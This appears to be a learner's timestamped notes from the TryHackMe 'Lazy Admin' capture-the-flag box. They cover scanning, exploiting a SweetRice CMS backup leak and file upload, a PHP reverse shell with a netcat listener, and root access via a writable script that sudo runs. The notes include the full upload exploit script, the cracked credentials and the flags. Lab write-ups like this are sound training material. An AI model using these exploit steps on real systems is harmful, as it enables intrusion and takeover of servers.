```

Lazy Admin (EASY) - TCM Linux Priv esc class capstone #1
IP:10.10.216.239
```

```
3:50 PM 1/10/2023
ping 10.10.216.239
```

```
3:52 PM 1/10/2023
nmap -sC -sV -oA nmapbasic 10.10.216.239
	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
	|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
	|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
	80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
	|_http-title: Apache2 Ubuntu Default Page: It works
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


```
3:53 PM 1/10/2023
nmap -sC -sV -p- -oA nmapfull 10.10.216.239
#running while working on previous nmap
```

```
3:56 PM 1/10/2023
dirsearch -u http://10.10.216.239:80 -x 400,401,403 > dirsearch.txt

	Target: http://10.10.216.239:80/

	[20:56:47] Starting: 
	[20:57:31] 301 -  316B  - /content  ->  http://10.10.216.239/content/
	[20:57:31] 200 -    2KB - /content/
	[20:57:41] 200 -   11KB - /index.html

	Task Completed
```

```
4:09 PM 1/10/2023
Basic CMC SweetRice Downloaded on web server.
searchsploit sweetrice

------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
SweetRice 0.5.3 - Remote File Inclusion    | php/webapps/10246.txt
SweetRice 0.6.7 - Multiple Vulnerabilities | php/webapps/15413.txt
SweetRice 1.5.1 - Arbitrary File Download  | php/webapps/40698.py
SweetRice 1.5.1 - Arbitrary File Upload    | php/webapps/40716.py
SweetRice 1.5.1 - Backup Disclosure        | php/webapps/40718.txt
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40692.html
SweetRice 1.5.1 - Cross-Site Request Forge | php/webapps/40700.html
SweetRice < 0.6.4 - 'FCKeditor' Arbitrary  | php/webapps/14184.txt
------------------------------------------- ---------------------------------
Shellcodes: No Results
 
searchsploit -x php/webapps/10246.txt

googled sweetrice exploits 
```

```
4:38 PM 1/10/2023
https://www.exploit-db.com/exploits/40718

tried http://10.10.216.239/content/inc/ and it worked.
```

```
4:41 PM 1/10/2023
looking around, havent really found anything.
```

```
4:46 PM 1/10/2023
dirsearching further
dirsearch -u http://10.10.216.239/content/inc:80 -x 400,401,403
```

```
4:52 PM 1/10/2023
pulled back sql file, had hash in it # NEED TO PAY MORE ATTENTION TO DETAIL. 
42f749ade7f9e195bf475f37a44cafcb
```

```
4:54 PM 1/10/2023
THROWING INTO CRACKSTATION.

Password123
admin@10.10.216.239 # did not work. Unsure what usernmae is, gotta keep looking.

potential usernames:
admin
manager

passwords:
Password123
```

```
5:05 PM 1/10/2023 Received hint to look at molre exploits that can utiliza usernames and passwords.


https://www.exploit-db.com/exploits/40716


import requests
import os
from requests import session

if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
    pass
banner = '''
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
|  _________                      __ __________.__                  |
| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
|        \/             \/     \/            \/        \/    \/     |                                                    
|    > SweetRice 1.5.1 Unrestricted File Upload                     |
|    > Script Cod3r : Ehsan Hosseini                                |
+-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
'''

print(banner)


# Get Host & User & Pass & filename
host = input("Enter The Target URL(Example : localhost.com) : ")
username = input("manager")
password = input("password123")
filename = input("Enter FileName (Example:.htaccess,shell.php5,index.html) : ")
file = {'upload[]': open(filename, 'rb')}

payload = {
    'user':username,
    'passwd':password,
    'rememberMe':''
}



with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
    success = 'Login success'
    if login.status_code == 200:
        print("[+] Sending User&Pass...")
        if login.text.find(success) > 1:
            print("[+] Login Succssfully...")
        else:
            print("[-] User or Pass is incorrent...")
            print("Good Bye...")
            exit()
            pass
        pass
    uploadfile = r.post('http://' + host + '/as/?type=media_center&mode=upload', files=file)
    if uploadfile.status_code == 200:
        print("[+] File Uploaded...")
        print("[+] URL : http://" + host + "/attachment/" + filename)
        pass  
```

```		
5:09 PM 1/10/2023
Making php reverse shell
```

```
5:40 PM 1/10/2023
attempted 40716.py, didnt work.
navigated to  http://10.10.216.239/content/as/ to put in login due to code stating where it is loggin in anyways
	with session() as r:
    login = r.post('http://' + host + '/as/?type=signin', data=payload)
```

```	
5:42 PM 1/10/2023
On box  http://10.10.216.239/content/as/
with manager:Password123
```

```
5:53 PM 1/10/2023
# nc -lvnp 1234                              
listening on [any] 1234 ...


under themes folder, replaced php code with php-reverse-shell.php code. figuring out way to activate code
```

```
5:56 PM 1/10/2023
themes page showed where the main.php was
	_themes/default/main.php 

10.10.216.239/content/_themes/default/main.php
#this activated payload, i am on target

$ whoami
www-data
$ 

$ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

$ cd /home/itguy/
$ ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
backup.pl
examples.desktop
mysql_login.txt
user.txt
$ cat user.txt
THM{63e5bce9271952aad1113b6f1ac28a07}


$ cat mysql_login.txt
rice:randompass

python -c "import pty;pty.spawn('/bin/bash')"
# used to spawn a bash shell

echo "/bin/bash" > /etc/copy.sh

www-data@THM-Chal:/$ sudo /usr/bin/perl /home/itguy/backup.pl
sudo /usr/bin/perl /home/itguy/backup.pl

root@THM-Chal:/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@THM-Chal:/# 


root@THM-Chal:~# cat root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}

going to retry box from scratch.
```




